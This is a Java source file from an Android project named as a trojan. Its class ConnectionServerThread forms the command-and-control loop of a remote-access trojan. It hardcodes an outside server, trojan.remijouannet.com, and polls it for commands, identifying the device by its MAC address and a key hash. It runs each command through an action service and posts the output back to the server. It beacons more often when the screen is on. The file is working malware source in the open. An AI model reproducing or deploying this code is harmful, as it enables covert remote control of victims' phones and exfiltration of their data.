package trojan.android.android_trojan.Action;

import android.content.Context;
import android.os.Looper;


import java.net.MalformedURLException;
import java.net.URL;


public class ConnectionServerThread implements Runnable {
    private static final String TAG = "ConnectionServerTask";
    private ActionService actionService;
    private String host;
    private String port;
    private URL urlaction;
    private URL urlresult;
    private Context context;
    private long timeon;
    private long timeoff;
    private long time;
    private long detla;
    private String SALT = "LOL";
    private String KEY = null;
    private String HASH = null;
    private String MAC = null;
    private boolean cancel = false;
    private IHttpURLConnection httpURLConnection;


    public ConnectionServerThread(Context context){
        /*this.KEY = SALT + context.getResources().getString(R.string.KEY);
        this.host = context.getResources().getString(R.string.HOST);
        this.port = context.getResources().getString(R.string.PORT);
        this.timeon = Integer.valueOf(context.getResources().getString(R.string.TIMEON));
        this.timeoff = Integer.valueOf(context.getResources().getString(R.string.TIMEOFF));*/

        this.context = context;
        this.httpURLConnection = new HttpsURLConnectionHelper();
        this.KEY = SALT + "8df639b301a1e10c36cc2f03bbdf8863";
        this.host = "trojan.remijouannet.com";
        this.port = "443";
        this.timeon = 4000;
        this.timeoff = 54000;
        this.time = timeon;
        actionService = new ActionService(context);
        this.HASH = Tools.SHA1(this.KEY);
        this.MAC = Tools.getMacAddress(this.context);

        try {
            this.urlaction = new URL("https://"+ host +":"+port+"/action");
            this.urlresult = new URL("https://"+ host +":"+port+"/result");
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        Looper.prepare();
        //Looper.loop();
        String result;
        long now;
        while (!isCancel()) {
            now = System.currentTimeMillis();

            if (time != timeoff && !Tools.isScreenOn(context)) {
                time = timeoff;
            }else if (time != timeon && Tools.isScreenOn(context)) {
                time = timeon;
            }

            if (detla > time) {
                result = this.httpURLConnection.getHttp(urlaction, this.MAC + "::::" +this.HASH);
                if (result != null && !result.equals("null")) {
                    this.httpURLConnection.postHttp(urlresult, actionService.action(result), this.MAC + "::::" +this.HASH);
                    detla = 0;
                }
            }

            detla += now;
            Tools.sleep(timeon/2);
        }

    }

    public boolean isCancel(){
        return this.cancel;
    }

    public void cancel(){
        this.cancel = true;
    }
}
